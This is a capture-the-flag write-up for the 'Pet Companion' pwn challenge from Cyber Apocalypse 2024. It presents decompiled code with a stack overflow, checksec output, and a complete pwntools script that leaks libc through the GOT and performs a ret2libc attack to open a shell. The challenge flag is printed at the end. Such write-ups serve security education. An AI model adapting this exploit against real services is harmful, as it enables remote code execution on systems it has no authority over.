# Cyber Apocalypse 2024

## Pet Companion

> Embark on a journey through this expansive reality, where survival hinges on battling foes. In your quest, a loyal companion is essential. Dogs, mutated and implanted with chips, become your customizable allies. Tailor your pet's demeanor—whether happy, angry, sad, or funny—to enhance your bond on this perilous adventure.
> 
> Author: w3th4nds
> 
> [`pwn_pet_companion.zip`]pwn_pet_companion.zip

Tags: _pwn_

## Solution
The challenge comes with a binary which we put to Ghidra. The main is very short, it only writes a message, reads some user input and writes again a message. 

```c
undefined8 main(void)
{
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  setup();
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  write(1,"\n[!] Set your pet companion\'s current status: ",0x2e);
  read(0,&local_48,0x100);
  write(1,"\n[*] Configuring...\n\n",0x15);
  return 0;
}
```

We also check what security measurements are in place:

```bash
$ checksec pet_companion
[*] '/home/ctf/cyber/pwn/pet/challenge/pet_companion'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
```

So, we don't have a canary, this enables us to `overflow` and `rop`. With `no PIE` we know the addresses are fixed for the image. Since we don't have a win function or system or anything interesting in the binary, we can fall back to return to libc, which has `system`. The only problem is, we need to leak a libc address, since libc is not loaded to a fixed address due to `ASLR`.

Since the program calls to `write` we can in fact leak the address of `write` which we know is stored in the binaries `GOT`. So we have to do two stages, first leak the libc address of `write` and return back to `main`. The second time we know where libc is loaded to and can calculate the address to `system` to get a shell.

The following code does this and running it gives us the flag.

```python
from pwn import *

p = remote("83.136.255.230", 32842)
context.binary = binary = ELF("./pet_companion")
libc = ELF("./glibc/libc.so.6")

offset          = 0x48
pop_rdi         = 0x400743
pop_rsi_pop_r15 = 0x400741

# first stage, leak a libc address
payload = flat({
    offset: [
        pop_rdi,
        1,
        pop_rsi_pop_r15,
        binary.got["write"],
        0,
        binary.sym.write,
        binary.sym.main
    ]
})

p.sendline(payload)
p.recvuntil(b"Configuring...\n\n")
addr = u64(p.recv(6).ljust(8, b"\x00"))
libc.address = addr - libc.symbols["write"]

# second stage, ret2libc
sh = p64(next(libc.search(b"/bin/sh")))
system = p64(libc.symbols["system"])

payload = flat({
    offset: [
        pop_rdi,
        sh,
        system
    ]
})

p.sendline(payload)
p.interactive()
```

Flag `HTB{c0nf1gur3_w3r_d0g}`